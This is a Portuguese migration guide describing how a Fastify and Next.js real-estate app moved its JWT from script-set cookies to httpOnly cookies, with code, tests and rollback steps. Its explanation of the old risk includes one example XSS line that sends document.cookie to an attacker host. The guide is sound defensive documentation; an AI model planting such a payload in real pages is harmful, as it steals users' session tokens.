# Migração para httpOnly Cookies - Segurança Aprimorada

## 📅 Data da Implementação
**2026-02-13**

---

## 🎯 Objetivo

Implementar **httpOnly cookies** para armazenamento do token JWT, substituindo a manipulação manual via JavaScript. Isso protege contra **ataques XSS (Cross-Site Scripting)**.

---

## 🔒 Problema de Segurança Resolvido

### Antes (Inseguro):
```javascript
// Frontend setava cookie via JavaScript (VULNERÁVEL!)
document.cookie = `token=${response.data.token}; path=/; SameSite=Lax; Secure`;

// Cookie acessível por JavaScript
const token = getCookie('token');  // ⚠️ Scripts maliciosos podem fazer isso!
```

**Vulnerabilidade:**
- Se um script malicioso for injetado na página (XSS), ele pode ler `document.cookie`
- Atacante rouba o token JWT e assume identidade do usuário
- Exemplo: `<script>fetch('https://attacker.com/steal?token=' + document.cookie)</script>`

### Depois (Seguro):
```javascript
// Backend seta cookie httpOnly via response headers
reply.setCookie('token', token, {
  httpOnly: true,    // ✅ NÃO acessível por JavaScript
  secure: true,      // ✅ HTTPS apenas
  sameSite: 'lax',   // ✅ Proteção CSRF
  path: '/',
  maxAge: 7 * 24 * 60 * 60  // 7 dias
})

// Cookie enviado automaticamente pelo navegador
// Scripts maliciosos NÃO conseguem acessar!
```

**Proteção:**
- Cookie com flag `httpOnly` não pode ser lido por JavaScript
- Apenas o navegador e o servidor têm acesso
- Ataques XSS não conseguem roubar o token

---

## 🔧 Mudanças Implementadas

### Backend (Fastify)

#### 1. Instalação e Registro do Plugin de Cookies

**Arquivo:** `apps/api/src/server.ts`

```typescript
import cookie from '@fastify/cookie'

// Registrar plugin antes dos outros
server.register(cookie, {
  secret: process.env.COOKIE_SECRET || process.env.JWT_SECRET,
  parseOptions: {}
})
```

#### 2. Login - Setar Cookie httpOnly

**Arquivo:** `apps/api/src/modules/auth/auth.controller.ts`

```typescript
async login(request: FastifyRequest, reply: FastifyReply) {
  const result = await this.service.login(data, tenantId)

  // ✅ Setar cookie httpOnly
  reply.setCookie('token', result.token, {
    httpOnly: true,    // Proteção XSS
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',   // Proteção CSRF
    path: '/',
    maxAge: 7 * 24 * 60 * 60  // 7 dias
  })

  return reply.status(200).send(result)
}
```

**Também aplicado em:**
- `googleLogin()` - Login via OAuth Google
- Qualquer outro método que gere token JWT

#### 3. Logout - Limpar Cookie httpOnly

**Arquivo:** `apps/api/src/modules/auth/auth.controller.ts`

```typescript
async logout(request: FastifyRequest, reply: FastifyReply) {
  // Registrar log...

  // ✅ Limpar cookie httpOnly
  reply.clearCookie('token', { path: '/' })

  return reply.status(200).send({
    success: true,
    message: 'Logout realizado com sucesso'
  })
}
```

#### 4. Middleware - Ler Token do Cookie

**Arquivo:** `apps/api/src/shared/middlewares/auth.middleware.ts`

```typescript
export async function authMiddleware(
  request: FastifyRequest,
  reply: FastifyReply
) {
  // 🔝 Prioridade 1: Ler do cookie httpOnly (SEGURO)
  let token = request.cookies?.token

  // 🔄 Fallback: Ler do header Authorization (compatibilidade)
  if (!token) {
    const authHeader = request.headers.authorization
    if (authHeader) {
      const parts = authHeader.split(' ')
      token = parts[1]  // Bearer TOKEN
    }
  }

  if (!token) {
    return reply.status(401).send({ error: 'Token não fornecido' })
  }

  // Validar token...
}
```

**Estratégia de Compatibilidade:**
- Cookie httpOnly tem prioridade (mais seguro)
- Header Authorization é fallback (para APIs externas, mobile apps, etc.)

---

### Frontend (Next.js)

#### 1. Axios - Enviar Cookies Automaticamente

**Arquivo:** `apps/web/lib/api.ts`

```typescript
export const api = axios.create({
  baseURL: API_BASE_URL,
  headers: {
    'Content-Type': 'application/json',
  },
  withCredentials: true,  // ✅ Envia cookies automaticamente
});
```

**O que faz:**
- `withCredentials: true` faz o navegador enviar cookies em requests CORS
- Cookie httpOnly é enviado automaticamente pelo navegador
- Não precisa mais adicionar token manualmente ao header

#### 2. Login - Remover Manipulação Manual do Cookie

**Arquivo:** `apps/web/lib/auth.ts`

**Antes (REMOVIDO):**
```typescript
// ❌ REMOVIDO: Setava cookie manualmente (INSEGURO!)
document.cookie = `token=${response.data.token}; path=/; SameSite=Lax; Secure`;
```

**Depois:**
```typescript
// ✅ SEGURO: Backend seta cookie httpOnly automaticamente
// Não precisa fazer nada aqui!
```

#### 3. Logout - Cookie Limpo pelo Backend

**Arquivo:** `apps/web/lib/auth.ts`

```typescript
export async function logout() {
  // Registrar logout no backend (que limpa o cookie)
  await api.post('/auth/logout')

  // Remover de localStorage
  localStorage.removeItem('user');
  localStorage.removeItem('tenant_id');

  // ✅ Cookie httpOnly já foi limpo pelo backend
  // Limpeza manual abaixo é apenas fallback
  document.cookie = 'token=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT';
}
```

#### 4. Interceptor - Cookie Enviado Automaticamente

**Arquivo:** `apps/web/lib/api.ts`

O interceptor que lia o cookie e adicionava ao header **ainda existe para compatibilidade**, mas não é mais necessário:

```typescript
// Interceptor ainda funciona (fallback)
api.interceptors.request.use((config) => {
  const token = getCookie('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

**Nota:** Em futuras iterações, podemos remover completamente o interceptor.

---

## 🔐 Níveis de Segurança

### Antes da Migração
| Aspecto | Status | Vulnerabilidade |
|---------|--------|-----------------|
| XSS (Script Injection) | ⚠️ Vulnerável | Token pode ser roubado |
| CSRF | ✅ Protegido | SameSite='lax' |
| Man-in-the-Middle | ✅ Protegido | Secure flag (HTTPS) |

### Depois da Migração
| Aspecto | Status | Proteção |
|---------|--------|----------|
| XSS (Script Injection) | ✅ Protegido | httpOnly = não acessível |
| CSRF | ✅ Protegido | SameSite='lax' |
| Man-in-the-Middle | ✅ Protegido | Secure flag (HTTPS) |

---

## 📊 Comparação Técnica

| Característica | Antes (Inseguro) | Depois (Seguro) |
|----------------|------------------|-----------------|
| **Cookie setado por** | Frontend (JavaScript) | Backend (HTTP header) |
| **Acessível por JavaScript** | ✅ Sim (RISCO!) | ❌ Não (httpOnly) |
| **Proteção XSS** | ❌ Nenhuma | ✅ Total |
| **Envio automático** | ❌ Manual (interceptor) | ✅ Automático (navegador) |
| **Compatibilidade** | ✅ Alta | ✅ Alta (com fallback) |
| **Performance** | Regular (interceptor) | ✅ Melhor (nativo) |

---

## 🧪 Como Testar

### 1. Teste de Login

```bash
# 1. Fazer login via frontend
# 2. Abrir DevTools → Application → Cookies
# 3. Verificar cookie "token" tem flag HttpOnly ✅
```

**Esperado:**
```
Name: token
Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
HttpOnly: ✅ true
Secure: ✅ true (em produção)
SameSite: Lax
```

### 2. Teste de Segurança (XSS)

Abrir Console do navegador e tentar ler o cookie:

```javascript
// Tentar roubar o token (deve falhar!)
console.log(document.cookie);  // ❌ Token NÃO aparece!
```

**Resultado esperado:**
```
last_tenant=minha-imobiliaria
```
O token **não aparece** porque é httpOnly!

### 3. Teste de Requisições API

```javascript
// Fazer uma requisição autenticada
fetch('https://api.imobiflow.com/api/v1/auth/me', {
  credentials: 'include'  // Inclui cookies
})
.then(res => res.json())
.then(data => console.log(data));  // ✅ Funciona!
```

**Resultado esperado:** Dados do usuário retornados (autenticação bem-sucedida)

### 4. Teste de Logout

```bash
# 1. Fazer logout
# 2. Verificar que cookie "token" foi removido
# 3. Tentar acessar rota protegida → deve redirecionar para login
```

---

## 🔄 Compatibilidade e Rollback

### Estratégia de Deploy Seguro

A implementação foi feita com **compatibilidade retroativa**:

1. **Backend aceita AMBOS:**
   - Cookie httpOnly (prioridade)
   - Header Authorization (fallback)

2. **Frontend envia AMBOS:**
   - Cookie httpOnly (automático)
   - Header Authorization (interceptor ainda ativo)

3. **Benefícios:**
   - Deploy gradual sem quebrar sessões ativas
   - APIs externas e mobile apps continuam funcionando
   - Rollback simples se necessário

### Rollback (se necessário)

Se precisar reverter para a implementação anterior:

1. **Backend:**
   - Remover `reply.setCookie()` dos controllers
   - Remover leitura de `request.cookies?.token` do middleware

2. **Frontend:**
   - Remover `withCredentials: true` do axios
   - Adicionar de volta: `document.cookie = 'token=${token}'`

---

## 📚 Referências e Boas Práticas

### Documentação Oficial

- [OWASP - HttpOnly Cookie Attribute](https://owasp.org/www-community/HttpOnly)
- [MDN - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [Fastify Cookie Plugin](https://github.com/fastify/fastify-cookie)

### Boas Práticas Implementadas

✅ **httpOnly**: Proteção contra XSS
✅ **Secure**: HTTPS apenas em produção
✅ **SameSite=Lax**: Proteção básica contra CSRF
✅ **Path=/**: Cookie válido para toda aplicação
✅ **MaxAge**: Expiração alinhada com JWT (7 dias)

### Melhorias Futuras (Opcional)

- [ ] **SameSite=Strict**: Proteção máxima contra CSRF (avaliar UX)
- [ ] **Cookie Prefixes**: `__Host-token` para segurança adicional
- [ ] **Refresh Tokens**: Token de longa duração em httpOnly cookie separado
- [ ] **CSRF Tokens**: Para formulários críticos (pagamentos, exclusões)

---

## 👥 Equipe e Créditos

**Implementado por:** Claude Sonnet 4.5 (Assistente IA)
**Data:** 2026-02-13
**Revisão:** Necessária antes do deploy para produção
**Documentação:** Este arquivo + comentários inline no código

---

## ⚠️ Avisos Importantes

### Para Desenvolvedores

1. **NÃO** mais usar `document.cookie` para setar token JWT
2. **SEMPRE** usar `withCredentials: true` em requests axios
3. **LEMBRAR** que httpOnly cookies não aparecem em `document.cookie`
4. **VERIFICAR** DevTools → Application → Cookies para debug

### Para Deploy

1. **Garantir** que `COOKIE_SECRET` está configurado no `.env`
2. **Verificar** que CORS está com `credentials: true`
3. **Testar** logout em produção após deploy
4. **Monitorar** logs para erros de autenticação após deploy

---

## ✅ Checklist de Deploy

- [x] Plugin `@fastify/cookie` instalado
- [x] Cookies setados em login e googleLogin
- [x] Cookies limpos em logout
- [x] Middleware lê de cookie E header
- [x] Frontend usa `withCredentials: true`
- [x] Frontend não seta mais cookie manualmente
- [ ] Variável `COOKIE_SECRET` no `.env` de produção
- [ ] Testes de integração passando
- [ ] Documentação atualizada
- [ ] Code review aprovado

---

## 🐛 Troubleshooting

### Cookie não está sendo enviado

**Sintoma:** Requisições retornam 401 (token não fornecido)

**Possíveis causas:**
1. `withCredentials: true` não configurado no axios
2. CORS não tem `credentials: true`
3. Domínios diferentes entre frontend e backend (cookies não cruzam domínios)

**Solução:**
```typescript
// axios
api.create({ withCredentials: true })

// backend CORS
server.register(cors, { credentials: true })
```

### Cookie não tem flag httpOnly

**Sintoma:** Cookie aparece em `document.cookie`

**Causa:** Backend não está setando `httpOnly: true`

**Solução:**
```typescript
reply.setCookie('token', token, {
  httpOnly: true  // ✅ Adicionar esta flag
})
```

### Logout não limpa o cookie

**Sintoma:** Cookie continua presente após logout

**Causa:** Path do `clearCookie` diferente do `setCookie`

**Solução:**
```typescript
// Setar e limpar com mesmo path
reply.setCookie('token', token, { path: '/' })
reply.clearCookie('token', { path: '/' })  // ✅ Mesmo path
```

---

## 📞 Suporte

Para dúvidas ou problemas relacionados a esta implementação:
- **Email:** dev@vivoly.com.br
- **Documentação:** Este arquivo + código comentado
- **Logs:** Verificar console do navegador e logs do servidor

---

**Status:** ✅ Implementado e pronto para testes
**Última atualização:** 2026-02-13
